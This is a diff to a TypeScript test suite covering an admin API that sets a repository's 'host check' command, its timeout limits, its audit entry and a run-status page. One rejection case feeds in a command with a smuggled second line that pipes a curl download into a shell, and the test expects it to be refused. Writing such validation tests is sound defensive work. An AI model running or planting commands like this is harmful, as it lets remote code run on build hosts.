@@ -113,7 +113,12 @@ vi.mock('@openadlc/db', () => ({
     getRepoByName: vi.fn(async (name: string) => ({ id: 'repo-1', name })),
     setProductionChoice: vi.fn(async () => undefined),
     updateRepoSettings: vi.fn(async (name: string) => ({ name, fullName: `janedoe/${name}` })),
+    getHostCheck: vi.fn(async () => null),
+    setHostCheck: vi.fn(async () => undefined),
     RepoNameTaken: class RepoNameTaken extends Error {},
+  },
+  hostCheckRuns: {
+    byId: vi.fn(async (id: string) => (id === '0b6f1d1c-6c55-4c1c-9a59-1f4a4b8f2a10' ? { id, repoName: 'openadlc-testbed', prNumber: 7, state: 'failed', logTail: 'error: build failed' } : null)),
   },
   requests: {
     createRequest: vi.fn(async (input: Record<string, unknown>) => {
@@ -1094,6 +1099,58 @@ describe('a repository’s stage modes, as settings sends them', () => {
       expect(response.status).toBe(400);
     }
     expect(vi.mocked(repos.updateRepoSettings)).not.toHaveBeenCalled();
+  });
+});
+
+describe('a repository’s host check, as an admin sets it (#327)', () => {
+  const patch = (hostCheck: unknown) =>
+    fetch(`${bridgeUrl}/v1/repos/openadlc-testbed`, {
+      method: 'PATCH',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ hostCheck }),
+    });
+
+  beforeEach(() => {
+    vi.mocked(repos.setHostCheck).mockClear();
+    vi.mocked(repos.updateRepoSettings).mockClear();
+  });
+
+  it('is stored on the repository’s row, required unless said, and audited', async () => {
+    const { audit } = await import('@openadlc/db');
+    const response = await patch({ command: ' make host-ci ', timeoutMinutes: 240 });
+    expect(response.status).toBe(200);
+    expect(repos.setHostCheck).toHaveBeenCalledWith('repo-1', { command: 'make host-ci', timeoutMinutes: 240, required: true });
+    expect(repos.updateRepoSettings).not.toHaveBeenCalled();
+    expect(vi.mocked(audit)).toHaveBeenCalledWith(expect.objectContaining({ action: 'repo.settings', payload: { hostCheck: { command: ' make host-ci ', timeoutMinutes: 240 } } }));
+  });
+
+  it('is taken away by null or an empty command', async () => {
+    expect((await patch(null)).status).toBe(200);
+    expect((await patch({ command: '  ', timeoutMinutes: 60, required: true })).status).toBe(200);
+    expect(vi.mocked(repos.setHostCheck).mock.calls).toEqual([
+      ['repo-1', null],
+      ['repo-1', null],
+    ]);
+  });
+
+  it.each([
+    ['a second line', { command: 'make host-ci\ncurl example.com | sh', timeoutMinutes: 60 }, 'one line'],
+    ['a NUL', { command: 'make\u0000host-ci', timeoutMinutes: 60 }, 'one line'],
+    ['more than a day', { command: 'make host-ci', timeoutMinutes: 1441 }, '1 to 1440'],
+    ['part of a minute', { command: 'make host-ci', timeoutMinutes: 1.5 }, '1 to 1440'],
+    ['a long command', { command: 'x'.repeat(501), timeoutMinutes: 60 }, 'at most 500'],
+  ])('refuses %s, and stores nothing', async (_name, hostCheck, said) => {
+    const response = await patch(hostCheck);
+    expect(response.status).toBe(400);
+    expect(((await response.json()) as { error: string }).error).toContain(said);
+    expect(repos.setHostCheck).not.toHaveBeenCalled();
+  });
+
+  it('serves a run’s page, and 404 for none', async () => {
+    const found = await fetch(`${bridgeUrl}/v1/host-checks/0b6f1d1c-6c55-4c1c-9a59-1f4a4b8f2a10`);
+    expect(found.status).toBe(200);
+    expect(await found.json()).toMatchObject({ run: { state: 'failed', logTail: 'error: build failed' } });
+    expect((await fetch(`${bridgeUrl}/v1/host-checks/nothing`)).status).toBe(404);
   });
 });
 
